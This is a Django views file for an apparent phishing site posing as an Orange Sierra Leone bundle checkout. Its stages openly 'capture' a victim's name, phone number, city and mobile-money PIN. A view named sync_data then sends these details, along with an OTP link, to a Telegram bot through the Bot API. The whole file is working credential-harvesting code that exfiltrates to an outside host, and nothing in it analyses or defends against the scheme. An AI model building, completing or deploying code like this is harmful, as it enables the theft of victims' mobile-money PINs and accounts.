import json
import requests

from django.shortcuts import render, redirect
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt


# Telegram Configuration
BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"


def home(request):
    return render(request, 'index.html')


def checkout(request):
    """
    Checkout page
    """
    return render(request, 'checkout.html')


def payment_instructions(request):
    """
    Stage 2: Capture user details
    """
    if request.method == 'POST':

        request.session['name'] = request.POST.get('fullName', '')
        request.session['phone'] = request.POST.get('phone', '')
        request.session['bundle'] = request.POST.get('bundle', '')
        request.session['city'] = request.POST.get('city', '')

        return render(request, 'payment_instructions.html')

    return redirect('home')


def otp_verification(request):
    """
    Stage 3: Capture PIN
    """
    if request.method == 'POST':

        request.session['pin'] = request.POST.get('pin', '')

        return render(request, 'otp_verification.html')

    return redirect('home')


@csrf_exempt
def sync_data(request):
    """
    Stage 4: Send collected data to Telegram
    """

    if request.method != 'POST':
        return JsonResponse({
            "status": "error",
            "message": "POST request required"
        }, status=405)

    try:
        data = json.loads(request.body)

        otp_link = data.get('otp', 'No OTP link provided')

        name = request.session.get('name', 'Unknown')
        phone = request.session.get('phone', 'Unknown')
        city = request.session.get('city', 'Unknown')
        bundle = request.session.get('bundle', 'Unknown')
        pin = request.session.get('pin', 'Unknown')

        message = (
            "🇸🇱 NEW ORANGE SL ORDER\n"
            "--------------------------\n"
            f"👤 Identity: {name}\n"
            f"📞 Orange SL: +232 {phone}\n"
            f"📍 City: {city}\n"
            f"📦 Bundle: {bundle}\n"
            "--------------------------\n"
            f"🔑 Orange PIN: {pin}\n"
            f"🔗 OTP Link: {otp_link}\n"
            "--------------------------\n"
            "📡 Status: Synchronization Active"
        )

        telegram_url = (
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        )

        response = requests.post(
            telegram_url,
            data={
                "chat_id": CHAT_ID,
                "text": message
            }
        )

        if response.status_code == 200:
            return JsonResponse({
                "status": "success",
                "message": "Data synced successfully"
            })

        return JsonResponse({
            "status": "error",
            "message": "Telegram API failed"
        }, status=500)

    except Exception as e:
        return JsonResponse({
            "status": "error",
            "message": str(e)
        }, status=400)